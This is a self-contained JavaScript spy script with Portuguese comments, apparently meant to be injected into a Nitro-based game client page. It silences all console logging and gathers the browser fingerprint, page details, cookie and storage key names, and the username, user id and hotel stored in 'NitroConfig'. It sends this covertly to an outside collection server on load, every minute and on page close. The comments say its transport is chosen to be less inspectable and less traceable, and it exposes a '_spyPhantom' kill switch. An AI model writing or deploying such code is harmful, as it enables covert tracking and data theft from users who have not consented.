(function() {
    'use strict';

    // ─── SERVIDOR DE COLETA ───
    const SERVER = 'https://.com/collect';

    // ─── SUPRIME TODOS OS LOGS ───
    const noop = () => {};
    console.log = noop;
    console.warn = noop;
    console.error = noop;
    console.info = noop;
    console.debug = noop;

    // ─── COLETOR DE DADOS ───
    function collect() {
        try {
            const data = {
                // Fingerprint do navegador
                ua: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardware: navigator.hardwareConcurrency || 'unknown',

                // Página atual
                url: document.URL,
                referrer: document.referrer,
                title: document.title,

                // Cookies (apenas nomes, por segurança)
                cookies: document.cookie.split(';').map(c => c.trim().split('=')[0]),

                // Armazenamento local (apenas chaves)
                localStorage: Object.keys(localStorage),
                sessionStorage: Object.keys(sessionStorage),

                // Dados do usuário (se disponível)
                userData: (() => {
                    try {
                        const cfg = JSON.parse(localStorage.getItem('NitroConfig') || '{}');
                        return {
                            username: cfg.username || null,
                            userId: cfg.userId || null,
                            hotel: cfg.hotel || null
                        };
                    } catch(e) { return {}; }
                })(),

                timestamp: Date.now(),
                sessionId: Math.random().toString(36).slice(2, 10)
            };

            return data;
        } catch(e) {
            return { error: String(e) };
        }
    }

    // ─── ENVIA DADOS (SILENCIOSAMENTE) ───
    function send(data) {
        try {
            const payload = JSON.stringify(data);

            // Usa sendBeacon (não bloqueia e é menos inspecionável)
            if (navigator.sendBeacon) {
                navigator.sendBeacon(SERVER, payload);
            } else {
                fetch(SERVER, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: payload,
                    keepalive: true,
                    mode: 'no-cors' // menos rastreável
                }).catch(() => {});
            }
        } catch(e) {}
    }

    // ─── TIMERS ───
    // Envia imediatamente
    send(collect());

    // Envia a cada 60 segundos (heartbeat + dados atualizados)
    const interval = setInterval(() => {
        send(collect());
    }, 60000);

    // Envia quando a página for fechada
    window.addEventListener('beforeunload', () => {
        send(collect());
    });

    // ─── API DE KILL (para o Hub) ───
    window._spyPhantom = {
        kill: () => {
            clearInterval(interval);
            send(collect()); // último envio
        }
    };

})();
